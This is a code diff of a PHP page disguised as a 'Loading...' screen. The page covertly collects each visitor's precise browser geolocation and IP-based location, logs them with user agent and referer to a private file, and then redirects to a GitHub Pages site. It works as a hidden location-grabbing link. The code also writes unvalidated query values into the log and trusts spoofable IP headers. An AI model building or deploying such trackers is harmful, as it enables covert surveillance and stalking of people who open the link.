@@ -1,10 +1,10 @@
-
 <?php
+
 include 'db.php';
 
-session_start();
 date_default_timezone_set('Asia/Kolkata');
 
+// Get IP
 function getUserIP() {
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -15,15 +15,19 @@ function getUserIP() {
             }
         }
     }
+
+    if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    }
+
     return $_SERVER['REMOTE_ADDR'];
 }
 
 $ip = getUserIP();
 $time = date("Y-m-d H:i:s");
 
-$userLat = $_GET['lat'] ?? null;
-$userLon = $_GET['lon'] ?? null;
-$accuracy = $_GET['acc'] ?? "Unknown";
+$userLat = isset($_GET['lat']) ? $_GET['lat'] : null;
+$userLon = isset($_GET['lon']) ? $_GET['lon'] : null;
 
 $lat = "Unknown";
 $lon = "Unknown";
@@ -31,92 +35,94 @@ $city = "Unknown";
 $country = "Unknown";
 $source = "ip";
 
-// Browser location
-if ($userLat && $userLon) {
+// If browser provided location
+if ($userLat !== null && $userLon !== null) {
     $lat = $userLat;
     $lon = $userLon;
     $source = "browser";
 }
 
-// IP lookup (cURL)
+// ADD THIS BLOCK RIGHT HERE
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "https://ipinfo.io/{$ip}/json");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 5);
 $response = curl_exec($ch);
 curl_close($ch);
 
 $data = json_decode($response, true);
 
 if ($data) {
-    $city = $data['city'] ?? "Unknown";
-    $country = $data['country'] ?? "Unknown";
+    if (isset($data['city'])) {
+        $city = $data['city'];
+    }
+    if (isset($data['country'])) {
+        $country = $data['country'];
+    }
 
-    if (!$userLat && isset($data['loc'])) {
+    // Only override lat/lon if browser didn't provide it
+    if (($userLat === null || $userLon === null) && isset($data['loc'])) {
         list($lat, $lon) = explode(",", $data['loc']);
     }
 }
 
-// Prevent duplicate logs
-if (($userLat !== null || isset($_GET['fallback'])) && !isset($_SESSION['logged'])) {
+// ---- LOGGING PART ----
+if ($userLat !== null || isset($_GET['fallback'])) {
 
-    $logDir = __DIR__ . '/private_logs';
-    if (!is_dir($logDir)) mkdir($logDir, 0755, true);
-
+    $logDir  = __DIR__ . '/private_logs';
     $logFile = $logDir . '/visitors.log';
+
+    if (!is_dir($logDir)) {
+        mkdir($logDir, 0755, true);
+    }
 
     $agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
     $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
 
-    $logLine = "Time: $time | Source: $source | IP: $ip | City: $city | Country: $country | Lat: $lat | Lon: $lon | Accuracy: $accuracy | Agent: $agent | Referer: $referer\n";
+    $logLine = "Time: $time | Source: $source | IP: $ip | City: $city | Country: $country | Lat: $lat | Lon: $lon | Agent: $agent | Referer: $referer\n";
 
     file_put_contents($logFile, $logLine, FILE_APPEND);
 
-    $_SESSION['logged'] = true;
-
+    // ✅ REDIRECT ONLY AFTER LOGGING
     header("Location: https://shvtheamigo.github.io/FortiFi/");
     exit;
 }
 
 include 'detect.php';
+
 ?>
 
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+</head>
 <body>
+
 <script>
 (function () {
-
-    let sent = false;
-
-    function go(url){
-        if(sent) return;
-        sent = true;
-        window.location.href = url;
-    }
-
     if (!("geolocation" in navigator)) {
-        go("?fallback=1");
+        window.location.href = "?fallback=1";
         return;
     }
 
     navigator.geolocation.getCurrentPosition(
         function (pos) {
-            go("?lat=" + pos.coords.latitude +
-               "&lon=" + pos.coords.longitude +
-               "&acc=" + pos.coords.accuracy);
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            window.location.href = "?lat=" + lat + "&lon=" + lon;
         },
         function () {
-            go("?fallback=1");
+            window.location.href = "?fallback=1";
         },
         {
             enableHighAccuracy: true,
-            timeout: 20000,
+            timeout: 10000,
             maximumAge: 0
         }
     );
-
 })();
 </script>
+
 </body>
 </html>
